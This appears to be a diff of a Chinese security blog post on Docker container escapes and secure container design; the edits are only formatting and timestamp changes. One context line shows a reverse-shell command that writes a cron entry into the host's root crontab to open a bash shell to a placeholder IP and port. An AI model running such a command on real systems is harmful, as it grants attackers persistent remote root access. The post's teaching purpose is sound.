@@ -29,7 +29,7 @@
       switchTab();
       window.addEventListener('hashchange', switchTab, false);
   })();
-  </script><!-- hexo injector head_end end --></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/wy.png" alt="weyung" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives/">归档</a><a class="navbar-item" href="/categories/">分类</a><a class="navbar-item" href="/tags/">标签</a><a class="navbar-item" href="/links/">友链</a><a class="navbar-item" href="/about/">关于</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-04-03T09:22:00.000Z" title="4/3/2025, 5:22:00 PM">2025-04-03</time>发表</span><span class="level-item"><time dateTime="2025-04-22T03:00:21.824Z" title="4/22/2025, 11:00:21 AM">2025-04-22</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="level-item">33 分钟读完 (大约4981个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Docker 安全问题浅析</h1><div class="content"><p>学习一下常用的逃逸手法，以及如何设计一个安全的方案。</p>
+  </script><!-- hexo injector head_end end --></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/wy.png" alt="weyung" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives/">归档</a><a class="navbar-item" href="/categories/">分类</a><a class="navbar-item" href="/tags/">标签</a><a class="navbar-item" href="/links/">友链</a><a class="navbar-item" href="/about/">关于</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-04-03T09:22:00.000Z" title="4/3/2025, 5:22:00 PM">2025-04-03</time>发表</span><span class="level-item"><time dateTime="2025-04-22T03:17:35.503Z" title="4/22/2025, 11:17:35 AM">2025-04-22</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="level-item">33 分钟读完 (大约4986个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Docker 安全问题浅析</h1><div class="content"><p>学习一下常用的逃逸手法，以及如何设计一个安全的方案。</p>
 <span id="more"></span>
 
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从听说 Docker 给 root 会导致安全风险，潜意识就觉得 Docker 里的 root 和宿主机的 root 是一回事，但是被问到的时候面试官又说特权模式才会有风险，特权用户无所吊谓，不然 Namespaces 干嘛的呢？</p>
@@ -207,23 +207,26 @@
 <p>依然 <code>cd</code> <code>chroot</code> 一把梭，抑或反弹 shell：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#x27;</span> &gt;&gt; /mnt/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
 
-<h2 id="如何设计一个安全的容器方案"><a href="#如何设计一个安全的容器方案" class="headerlink" title="如何设计一个安全的容器方案"></a>如何设计一个安全的容器方案</h2><h3 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h3><p>未知攻，焉知防？<br>先说说 Docker 的安全隐患，Docker 的安全隐患主要分为三类：</p>
+<h2 id="如何设计一个安全的容器方案"><a href="#如何设计一个安全的容器方案" class="headerlink" title="如何设计一个安全的容器方案"></a>如何设计一个安全的容器方案</h2><h3 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h3><blockquote>
+<p>未知攻，焉知防？</p>
+</blockquote>
+<p>先说说 Docker 的安全隐患，唠一唠车轱辘话。<br>Docker 的安全隐患主要分为三类：</p>
 <ol>
-<li>宿主机的操作系统本身就存在安全隐患<br> 我们知道，Docker 跟宿主机是共享内核的，所以如果宿主机的内核存在漏洞，那么 Docker 也会受到影响。比如著名的脏牛提权漏洞（CVE-2016-5195）。</li>
-<li>容器自身的安全问题<ol>
+<li><strong>宿主机的操作系统</strong>本身就存在安全隐患<br> 我们知道，Docker 跟宿主机是<strong>共享内核</strong>的，所以如果宿主机的内核存在漏洞，那么 Docker 也会受到影响。比如著名的脏牛提权漏洞（CVE-2016-5195）。</li>
+<li><strong>容器自身</strong>的安全问题<ol>
 <li>滥用 Docker API 攻击</li>
 <li>Docker 逃逸攻击</li>
 <li>容器间通信的风险</li>
 <li>容器配置不当引起的安全问题</li>
 </ol>
 </li>
-<li>容器镜像安全问题<ol>
+<li><strong>容器镜像</strong>安全问题<ol>
 <li>无法检测安全性</li>
 <li>不安全的镜像源</li>
 </ol>
 </li>
 </ol>
-<h3 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h3><p>容器的安全防护应该从容器的整个生命周期来考虑，包括一个容器镜像从创建、传输、运行到停止的全过程。</p>
+<h3 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h3><p>容器的安全防护应该从容器的整个生命周期来考虑，包括一个容器镜像从<strong>创建、传输、运行到停止</strong>的全过程。</p>
 <ol>
 <li>创建阶段<ol>
 <li>代码审计</li>
@@ -250,7 +253,6 @@
 </ol>
 </li>
 </ol>
-<p>// To be continued…</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/security/userns-remap/#about-remapping-and-subordinate-user-and-group-ids">Isolate containers with a user Namespaces</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/679328995">Docker 魔法解密：探索 UnionFS 与 OverlayFS</a><br><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/">T Wiki</a></p>
 </div><div class="article-licensing box"><div class="licensing-title"><p>Docker 安全问题浅析</p><p><a href="https://blog.weyung.cc/2025/04/03/Docker 安全问题浅析/">https://blog.weyung.cc/2025/04/03/Docker 安全问题浅析/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>未央</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2025-04-03</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2025-04-22</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="CC BY-NC 4.0" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh"><i class="icon fab fa-creative-commons"></i><i class="icon fab fa-creative-commons-by"></i><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Web/">Web</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/images/wechatpay.png" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2025/04/04/2025%20XYCTF/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2025 XYCTF</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/04/03/SSRF%20&amp;%20CSRF/"><span class="level-item">SSRF &amp; CSRF</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content" id="valine-thread"></div><script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.16/dist/Valine.min.js"></script><script>new Valine({
             el: '#valine-thread',
